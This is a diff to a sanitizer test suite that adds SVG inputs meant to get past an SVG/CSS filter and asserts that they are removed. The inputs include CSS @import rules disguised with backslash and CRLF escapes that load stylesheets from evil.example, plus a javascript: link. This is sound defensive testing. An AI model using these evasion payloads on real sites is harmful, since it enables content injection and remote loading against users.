@@ -303,6 +303,8 @@ test('HOSTILE: what a hostile frame could say is taken out, and the labels and s
         href: run('<svg><a href="javascript:window.__x=4"><text>t</text></a></svg>'),
         decoy: run('<svg><style>/*@import;*/@\\69mport url(http://evil.example/d.css); .a{fill:red}</style><rect class="a"/></svg>'),
         doubled: run('<svg><style>@\\69mport url(http://evil.example/a.css); @\\5c\\5c 69mport url(http://evil.example/b.css); .a{fill:red}</style><rect class="a"/></svg>'),
+        single5c: run('<svg><style>@\\69mport url(http://evil.example/e.css); @\\5c 69mport url(http://evil.example/f.css); .a{fill:red}</style><rect class="a"/></svg>'),
+        crlf: run('<svg><style>@\\69&#13;&#10;mport url(http://evil.example/g.css); .a{fill:red}</style><rect class="a"/></svg>'),
         escaped: run('<svg><style>@\\69mport url(http://evil.example/i.css); .a{fill:red}</style><rect class="a"/></svg>'),
         target: run('<svg><a href="https://example.com/" target="_top"><text>t</text></a><a href="https://example.com/" target="_blank"><text>u</text></a></svg>'),
       };
@@ -315,10 +317,11 @@ test('HOSTILE: what a hostile frame could say is taken out, and the labels and s
     assert.doesNotMatch(out.sheet, /@import|evil\.example/);
     assert.doesNotMatch(out.terminator, /onerror/i);
     assert.doesNotMatch(out.href, /javascript:/i);
-    assert.match(out.escaped, /fill:\s*red/);
-    assert.doesNotMatch(out.escaped, /mport|evil\.example/i, 'an @import spelled with a CSS escape is dropped too');
+    assert.doesNotMatch(out.escaped, /mport|evil\.example/i, 'an @import spelled with a CSS escape drops the whole sheet');
     assert.doesNotMatch(out.decoy, /mport\s+url|evil\.example/i, 'a literal @import beside an escaped one does not turn the check off');
     assert.doesNotMatch(out.doubled, /@\\69mport/i, 'a doubled escape does not decode into a live one');
+    assert.doesNotMatch(out.single5c, /mport|evil\.example/i, 'a decoded backslash does not form a new live escape');
+    assert.doesNotMatch(out.crlf, /mport|evil\.example/i, 'an escape followed by CRLF is read as the browser reads it');
     assert.doesNotMatch(out.target, /_top/);
     assert.match(out.target, /target="_blank"/);
   } finally {
